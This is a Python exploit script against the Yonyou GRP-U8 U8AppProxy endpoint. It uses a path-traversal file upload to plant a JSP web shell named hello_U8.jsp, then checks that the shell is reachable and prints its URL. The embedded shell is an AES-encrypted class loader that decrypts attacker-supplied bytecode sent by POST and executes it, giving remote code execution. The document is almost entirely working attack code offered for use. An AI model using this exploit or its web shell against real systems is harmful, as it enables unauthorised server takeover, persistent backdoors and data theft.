#! python3

"""

@FileName: 用友 GRP-U8 U8AppProxy
@Author: londly
@Datetime: 20230316

"""

from urllib.parse import urljoin
import requests

requests.packages.urllib3.disable_warnings()


def isalive(url):
    respose = requests.get(url, timeout=30, verify=False)
    if respose.status_code == 200:
        return True
    return False


def upload(url):
    target = urljoin(url, "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hello_U8")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate"
    }
    shell_content = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'

    files = [('file', ('hello_U8.jsp', shell_content, 'application/octet-stream'))]
    response = requests.post(target, files=files, headers=headers, timeout=30, verify=False)
    if response.status_code == 200 and "25" == response.headers.get("Content-Length"):
        webshell = urljoin(url, "hello_U8.jsp")
        response = requests.get(webshell, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            print("[+] 文件上传成功！")
            print("[+] webshell: " + webshell)
        if response.status_code == 403:
            print("[-] 文件上传成功，但访问被拦截！")


if __name__ == '__main__':
    url = "http://127.0.0.1"
    try:
        if isalive(url):
            print("开始验证：" + url)
            upload(url)
    except Exception as e:
        print(str(e))